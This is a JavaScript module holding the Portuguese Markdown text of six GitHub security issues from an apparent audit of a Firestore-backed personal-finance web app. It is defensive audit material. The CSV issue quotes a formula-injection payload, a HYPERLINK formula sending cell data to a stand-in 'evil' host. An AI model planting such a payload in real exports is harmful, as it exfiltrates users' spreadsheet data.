/**
 * issues-github.mjs — o texto integral das issues, em Markdown.
 *
 * Fica separado dos achados porque tem outra natureza: o achado descreve o que
 * existe, a issue descreve o que fazer. Achados triviais do mesmo tema foram
 * agrupados numa issue só (A4 e A5 viraram a issue 4, ambas de postura de
 * configuração) para não gerar spam.
 */

export const ISSUES = [
  {
    n: 1,
    md: `## [Segurança] Publicar e automatizar o deploy das regras do Firestore

**Labels:** \`security\`, \`severidade: alta\`

### Problema

\`firestore.rules\` é o único controle de acesso do projeto. Não existe backend
próprio: o app inteiro roda no navegador do usuário e fala direto com o
Firestore. Se as regras publicadas no projeto divergirem deste arquivo, não
sobra nada separando os dados de um usuário dos de outro.

O repositório **não tem \`firebase.json\`** e **não tem CI**. O deploy na Vercel
publica apenas arquivos estáticos e nunca toca nas regras. O próprio comentário
do arquivo manda rodar \`firebase deploy --only firestore:rules\` — comando que
falha sem \`firebase.json\`.

### Por que é explorável

\`apiKey\` e \`projectId\` são públicos por desenho e estão no código servido
(\`js/firebase-init.js:15-26\`). Com eles, qualquer pessoa autentica no projeto
com a própria conta Google e fala com o Firestore. Se as regras publicadas
forem as de projeto novo (\`allow read, write: if true\`, ou a variante que só
exige \`request.auth != null\`), essa pessoa lê e escreve o ramo
\`users/{uid}\` de qualquer outro usuário.

### Evidência

\`\`\`
firestore.rules:10
// Publicar com:  firebase deploy --only firestore:rules
// (ou colar em Console → Firestore → Regras)
\`\`\`

\`\`\`bash
$ ls firebase.json
ls: cannot access 'firebase.json': No such file or directory
$ ls .github
ls: cannot access '.github': No such file or directory
\`\`\`

### Impacto

Leitura e escrita do histórico financeiro completo de todos os usuários do app.

### Condição de explorabilidade

Só se as regras publicadas divergirem do arquivo. **Não é verificável a partir
do repositório** — por isso o achado fica aberto até confirmação no console.

### Correção sugerida

1. Conferir no console do Firebase, regra a regra, contra \`firestore.rules\`.
2. Criar \`firebase.json\`:
   \`\`\`json
   { "firestore": { "rules": "firestore.rules" } }
   \`\`\`
3. Publicar com \`firebase deploy --only firestore:rules\`.
4. Acrescentar um workflow que publique a cada merge na \`main\`.

### Critérios de aceite

- [ ] \`firebase.json\` versionado, apontando para \`firestore.rules\`
- [ ] As regras publicadas conferem com o arquivo (print ou export do console anexado)
- [ ] Workflow de CI publica as regras no merge para \`main\`
- [ ] Uma conta Google diferente da dona não consegue ler \`users/{uid-da-dona}/transactions\` (teste manual documentado)
- [ ] O comentário de \`firestore.rules:10\` atualizado com o caminho real de publicação`,
  },
  {
    n: 2,
    md: `## [Segurança] Neutralizar injeção de fórmula no CSV exportado

**Labels:** \`security\`, \`severidade: média\`

### Problema

\`_exportarCSV\` monta as células tratando só a sintaxe do CSV (aspas
duplicadas). Não neutraliza o primeiro caractere. Célula começando com \`=\`,
\`+\`, \`-\`, \`@\`, TAB ou CR é interpretada como **fórmula** por Excel,
LibreOffice Calc e Google Sheets — as aspas em volta não impedem isso.

### Por que é explorável

A coluna \`descricao\` não é digitada só pela dona da planilha: ela vem do parse
de fatura em PDF (\`js/pdf-import.js\`) e de extrato CSV/OFX/PDF
(\`js/parsers/\`), ou seja, de arquivo emitido por terceiro. Um nome de
estabelecimento como \`=HYPERLINK("https://evil/?d="&A1;"Erro")\` atravessa o
app intacto — a gravação não filtra, e \`esc()\` só atua na saída HTML — e vira
fórmula viva na planilha de quem exportar o mês.

### Evidência

\`\`\`js
// js/mes.js:595
const celula = (v) => \`"\${String(v ?? '').replace(/"/g, '""')}"\`;

// js/mes.js:598 — l.desc entra sem tratamento
l.data || '', l.desc || '', cat?.name || '', l.origem,
\`\`\`

### Impacto

Exfiltração dos dados da planilha para domínio externo; em Excel com DDE
habilitado, diálogo de execução de comando.

### Correção sugerida

\`\`\`js
// js/mes.js:595 — prefixo de apóstrofo desarma a fórmula sem mudar o que se lê
const PERIGOSO = /^[=+\\-@\\t\\r]/;
const celula = (v) => {
  const s = String(v ?? '');
  return \`"\${(PERIGOSO.test(s) ? "'" + s : s).replace(/"/g, '""')}"\`;
};
\`\`\`

O backup em \`js/db.js\` é JSON e não é afetado.

### Critérios de aceite

- [ ] \`celula()\` prefixa toda célula que comece com \`= + - @ \\t \\r\`
- [ ] Um lançamento com descrição \`=1+1\` exporta como texto e aparece como \`=1+1\` ao abrir no Excel/Calc
- [ ] A coluna \`valor\` continua sendo lida como número pela planilha (não regrediu)
- [ ] Teste em \`test/\` cobrindo os seis caracteres de risco`,
  },
  {
    n: 3,
    md: `## [Segurança] Carregar Chart.js e PDF.js com Subresource Integrity

**Labels:** \`security\`, \`severidade: média\`

### Problema

Chart.js e PDF.js entram de CDN de terceiro como \`<script>\` global, sem
\`integrity\` e sem \`crossorigin\`. A CSP autoriza os dois hosts, o que é
correto, mas autorizar o host não verifica o conteúdo.

### Por que é explorável

Os dois scripts rodam na mesma origem do app, no mesmo documento em que
\`window._FB\` expõe a instância autenticada do Firestore
(\`js/firebase-init.js:33\`). Um arquivo alterado no CDN — comprometimento do
provedor, sequestro da conta do pacote, envenenamento da resposta — executa com
acesso total ao ramo \`users/{uid}\` do usuário logado, e pode exfiltrar por
\`connect-src https://*.googleapis.com\`, que a própria CSP libera.

### Evidência

\`\`\`html
<!-- index.html:9 -->
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<!-- index.html:11 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
<!-- ferramentas/dump-fatura.html:7 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
\`\`\`

### Impacto

Execução remota de código no contexto autenticado; leitura e escrita de todos os
dados financeiros do usuário.

### Correção sugerida

Ambas as bibliotecas já estão pinadas por versão, então o hash é estável:

\`\`\`html
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"
        integrity="sha384-…" crossorigin="anonymous"></script>
\`\`\`

Gerar com:
\`\`\`bash
curl -s <url> | openssl dgst -sha384 -binary | openssl base64 -A
\`\`\`

Alternativa mais forte: versionar os dois em \`vendor/\` e servir da própria
origem — o que permitiria apertar \`script-src\` para \`'self'\`.

### Critérios de aceite

- [ ] As três tags têm \`integrity\` (sha384) e \`crossorigin="anonymous"\`
- [ ] O app carrega e os gráficos desenham (Mês, Adiante, Guardado)
- [ ] A importação de fatura em PDF funciona
- [ ] Um hash errado de propósito bloqueia o carregamento (verificado no console)
- [ ] Documentado em \`CLAUDE.md\` que trocar a versão do CDN exige regerar o hash`,
  },
  {
    n: 4,
    md: `## [Segurança] Apertar a postura de configuração: CSP e trava de origem da chave do Firebase

**Labels:** \`security\`, \`severidade: baixa\`

> Dois itens de configuração agrupados numa issue só: nenhum é explorável
> sozinho, os dois se resolvem em console/arquivo de config, e abrir duas issues
> para isto seria ruído.

### Problema 1 — CSP: \`'unsafe-inline'\` em \`style-src\` e \`img-src https:\`

\`script-src\` já está sem \`'unsafe-inline'\` (foi o que motivou extrair
\`js/firebase-init.js\`), mas \`style-src\` ainda o traz e \`img-src\` aceita
qualquer host https.

\`\`\`
vercel.json:24
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; …
img-src 'self' data: https: blob:;
\`\`\`

Não é explorável sozinho — é a camada que deixaria de conter um XSS caso
apareça. Com \`'unsafe-inline'\` em \`style-src\`, uma injeção de atributo
\`style\` permite exfiltração por CSS; com \`img-src https:\`, para qualquer
domínio.

### Problema 2 — chave do Firebase sem trava de origem verificável

\`\`\`js
// js/firebase-init.js:15
apiKey: "AIzaSy…",
projectId: "fefe-df577",
\`\`\`

**Isto não é vazamento de segredo** — a chave de API Web do Firebase é pública
por desenho. O que impede abuso são dois controles fora do repositório: a lista
de domínios autorizados do Firebase Auth e as restrições da chave no Google
Cloud. Nenhum dos dois é verificável pelo código. Não há App Check no projeto.

### Impacto

Redução da defesa em profundidade; uso da cota do projeto por cliente não
autorizado.

### Correção sugerida

- \`img-src\`: trocar \`https:\` pela lista real — \`'self' data: blob: https://lh3.googleusercontent.com\`
- \`style-src\`: remover \`'unsafe-inline'\` **depois** de migrar os atributos
  \`style=\` para classe (trabalho de uma rodada inteira; não fazer junto)
- Console do Firebase → Authentication → Domínios autorizados: só o domínio da
  Vercel e \`localhost\`
- Google Cloud → Credenciais: restringir a chave por referenciador HTTP
- Avaliar App Check com reCAPTCHA Enterprise

Não adianta "esconder" a chave no código — isso não é correção.

### Critérios de aceite

- [ ] \`img-src\` sem \`https:\` genérico, e o avatar do Google continua carregando
- [ ] Domínios autorizados conferidos no console (print anexado)
- [ ] Chave restrita por referenciador HTTP no Google Cloud
- [ ] Decisão sobre App Check registrada na issue (adotar ou dispensar, com o porquê)
- [ ] Saída de \`'unsafe-inline'\` do \`style-src\` registrada como trabalho futuro, com o levantamento de quantos \`style=\` existem hoje`,
  },
  {
    n: 5,
    md: `## [Segurança] Fixar as regras do Firestore com teste automatizado

**Labels:** \`security\`, \`severidade: baixa\`, \`tipo: teste\`

### Problema

\`firestore.rules\` concentra todo o isolamento entre usuários e toda a
validação de campo do lado do servidor (faixa de valor, tamanho de descrição,
número de campos). Hoje a garantia de que ela está certa é uma leitura humana:
não há teste, e uma edição que afrouxe uma regra passa sem ninguém notar.

O projeto já roda testes em Node puro (\`test/saldos.test.mjs\`,
\`test/pdf-import.test.mjs\`, \`test/base-parser.test.mjs\`), então existe o
hábito e o lugar.

### Por que importa

Não é um achado explorável: é o que transforma o achado 1 de "conferido uma vez"
em "conferido a cada commit". Sem isso, toda a postura de segurança do projeto
depende de alguém reler um arquivo de 131 linhas.

### Evidência

\`\`\`
firestore.rules:45-118  — 9 blocos match, cada um com isOwner(uid) && verified()
firestore.rules:127-129 — match /{document=**} { allow read, write: if false; }
\`\`\`

Nenhum arquivo em \`test/\` referencia essas regras.

### Correção sugerida

Acrescentar \`@firebase/rules-unit-testing\` sobre o emulador do Firestore, com
os casos que importam:

- usuário A não lê \`users/{B}/transactions\`
- usuário A não escreve em \`users/{B}/*\`
- usuário sem \`email_verified\` é negado
- transação com \`amount\` acima de 10.000.000 é rejeitada
- descrição acima de 500 caracteres é rejeitada
- documento fora de \`/users\` é negado

### Critérios de aceite

- [ ] Suíte de regras rodando contra o emulador, invocável por um comando só
- [ ] Os seis casos acima cobertos e passando
- [ ] A suíte roda no CI junto com a publicação das regras (issue 1)
- [ ] Afrouxar qualquer \`match\` faz a suíte falhar (verificado quebrando de propósito)`,
  },
  {
    n: 6,
    md: `## [Segurança] Sair do \`'unsafe-inline'\` no \`style-src\` da CSP

**Labels:** \`security\`, \`severidade: baixa\`, \`refatoração\`

### Problema

\`script-src\` já está sem \`'unsafe-inline'\` — foi o que motivou extrair
\`js/firebase-init.js\`. \`style-src\` ainda tem, em \`vercel.json:24\`.

**Não é explorável sozinho.** É a camada que deixaria de conter um XSS caso um
apareça — e a auditoria de 19/09/2026 varreu as 61 ocorrências de \`innerHTML\`
sem achar furo na disciplina de \`esc()\`.

### O custo, medido em 19/09/2026

O bloqueio é a quantidade de atributos \`style="…"\` que os módulos escrevem
dentro de \`innerHTML\`. Cada um deles para de funcionar no instante em que
\`'unsafe-inline'\` sai do \`style-src\`.

\`\`\`
$ grep -o 'style="' js/*.js | wc -l
92
$ grep -o 'style="' index.html | wc -l
8
\`\`\`

**100 no total** — 92 nos módulos, 8 no shell. Por arquivo:

| arquivo | ocorrências |
|---|---|
| \`js/ajustes.js\` | 21 |
| \`js/mes.js\` | 12 |
| \`js/adiante.js\` | 11 |
| \`js/guardado.js\` | 9 |
| \`js/importar.js\` | 8 |
| \`index.html\` | 8 |
| \`js/orcamento.js\` | 7 |
| \`js/utils.js\` | 7 |
| \`js/conferir.js\` | 6 |
| \`js/extratos.js\` | 6 |
| \`js/cartao.js\` | 3 |
| \`js/pdf-import.js\` | 2 |

A maioria é espaçamento repetido, não estilo calculado: **28 são
\`style="margin:0"\`**, e os próximos mais comuns também são margem
(\`margin:8px 0 0\`, \`margin:0 0 16px\`, \`margin:0 0 10px\`, 4 cada). Isso vira um
punhado de classes utilitárias, não 100 decisões.

O resto é largura de campo (\`width:110px\`) e o punhado de casos em que o valor
é CALCULADO em tempo de render — barra de progresso, fatia da rosca, cor da
categoria. **Esses não viram classe**: precisam de \`setProperty()\` no nó depois
do \`innerHTML\`, ou de variável CSS escrita pelo mesmo caminho. É o que torna
isto uma rodada, e não um item de lista.

### Correção sugerida

Uma rodada própria, **depois** das issues 1 a 5:

1. Classes utilitárias para o espaçamento repetido (as 28 de \`margin:0\` e as
   margens vizinhas) — em \`css/style.css\`, junto do vocabulário v2.
2. Levantar os valores calculados e trocá-los por variável CSS aplicada ao nó
   depois do \`innerHTML\`.
3. Só então tirar \`'unsafe-inline'\` do \`style-src\`.

Tirar antes de 1 e 2 quebra a interface em silêncio: o navegador ignora o
atributo e não lança exceção — some o espaçamento e a barra de progresso fica
com largura zero.

### Critérios de aceite

- [ ] \`grep -o 'style="' js/*.js index.html | wc -l\` devolve 0
- [ ] \`style-src\` sem \`'unsafe-inline'\` em \`vercel.json\`
- [ ] As sete telas sem erro de CSP no console, **nos dois temas**
- [ ] Barra de progresso de meta, rosca de distribuição e cor de categoria
      continuam desenhando com o valor certo`,
  },
];
